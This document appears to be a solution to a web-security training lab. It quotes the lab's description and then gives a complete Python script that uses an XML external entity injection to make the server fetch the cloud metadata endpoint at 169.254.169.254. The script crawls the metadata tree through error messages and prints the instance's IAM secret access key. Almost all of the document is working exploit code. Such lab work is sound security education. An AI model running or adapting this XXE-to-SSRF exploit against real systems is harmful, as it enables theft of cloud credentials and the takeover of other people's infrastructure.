# Exploiting XXE to perform SSRF attacks
> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

```python
import requests
import re
import sys

# Configuration
BASE_URL = "https://0a1c0018037fe32080f9e976000e002a.web-security-academy.net/"

def execute_metadata_extraction(url):
    """Exploits XXE to perform SSRF and dynamically crawl AWS IAM metadata."""
    stock_api_endpoint = f"{url}product/stock"
    metadata_path_segments = []
    
    print("[*] Initiating AWS metadata extraction loop...")
    
    # 1. Extraction Phase: Loop to crawl through the metadata directories
    for i in range(20):
        current_path = "/".join(metadata_path_segments)
        target_uri = f"http://169.254.169.254/{current_path}"
        
        xml_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{target_uri}"> ]>\n'
            '<stockCheck>'
            '<productId>&xxe;</productId>'
            '<storeId>1</storeId>'
            '</stockCheck>'
        )
        
        response = requests.post(stock_api_endpoint, data=xml_payload)
        
        # Parse the error message to extract the directory name or the final IAM credentials
        match = re.search(r'"Invalid product ID: (.*?)"', response.text)
        
        if match:
            extracted_value = match.group(1).strip()
            metadata_path_segments.append(extracted_value)
            
            # Dynamic terminal output to track crawling progress
            sys.stdout.write(f"\r[*] Crawling: {target_uri}/{extracted_value}" + " " * 10)
            sys.stdout.flush()
        else:
            # 2. Verification Phase: Triggered when regex fails (usually upon hitting the final JSON object)
            print("\n[+] END OF METADATA TREE REACHED")
            print("[*] Verifying execution status...")
            
            verification_response = requests.get(url)
            
            if "Congratulations" in verification_response.text:
                print("[+] TARGET SECURED: LAB SOLVED\n")
                print("[*] Extracted IAM Credentials:")
                print(response.text.strip())
            else:
                print("[-] Exploit completed, but lab not solved.")
            
            # Exit loop once the target is secured
            return

if __name__ == "__main__":
    execute_metadata_extraction(BASE_URL)
```